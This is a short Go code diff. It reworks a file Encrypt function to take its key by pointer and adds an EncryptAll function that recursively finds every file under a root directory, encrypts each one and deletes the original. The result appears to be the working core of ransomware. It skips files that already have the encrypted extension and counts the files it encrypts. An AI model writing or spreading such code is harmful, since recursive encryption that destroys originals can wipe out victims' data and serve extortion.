@@ -6,7 +6,7 @@ import (
 )
 
 // Encrypt : encrypts file with key
-func Encrypt(fileSrc string, key []byte) (string, error) {
+func Encrypt(fileSrc string, key *[]byte) (string, error) {
 
 	encryptedFileName := fileSrc + EncryptedExt
 	decryptedFile, err := os.Open(fileSrc)
@@ -40,7 +40,7 @@ func Encrypt(fileSrc string, key []byte) (string, error) {
 	//Encrypts chunks of MaxSize data to encrypted file
 	for i = 0; i < iterations; i++ {
 		decryptedFile.Read(data)
-		encryption.Encrypt(&data, &key, &counter)
+		encryption.Encrypt(&data, key, &counter)
 		_, err = encryptedFile.Write(data)
 		if err != nil {
 			return "", err
@@ -53,7 +53,7 @@ func Encrypt(fileSrc string, key []byte) (string, error) {
 	if fi.Size()%int64(MaxSize) != 0 {
 		data = make([]byte, fi.Size()-iterations*int64(MaxSize))
 		decryptedFile.Read(data)
-		encryption.Encrypt(&data, &key, &counter)
+		encryption.Encrypt(&data, key, &counter)
 		_, err = encryptedFile.Write(data)
 		if err != nil {
 			return "", err
@@ -67,4 +67,22 @@ func Encrypt(fileSrc string, key []byte) (string, error) {
 	os.Remove(fileSrc)
 
 	return encryptedFileName, nil
+}
+
+// EncryptAll : encrypts all files from root directory all subdirectories
+func EncryptAll(rootFolder string, key *[]byte) (uint64, error) {
+	var encryptedFilesNbr uint64 = 0
+	files, err := DiscoverFiles(rootFolder)
+	if err != nil {
+		return encryptedFilesNbr, err
+	}
+	for _, file := range files {
+		if file[len(file)-len(EncryptedExt):] != EncryptedExt {
+			_, err := Encrypt(file, key)
+			if err == nil {
+				encryptedFilesNbr++
+			}
+		}
+	}
+	return encryptedFilesNbr, nil
 }
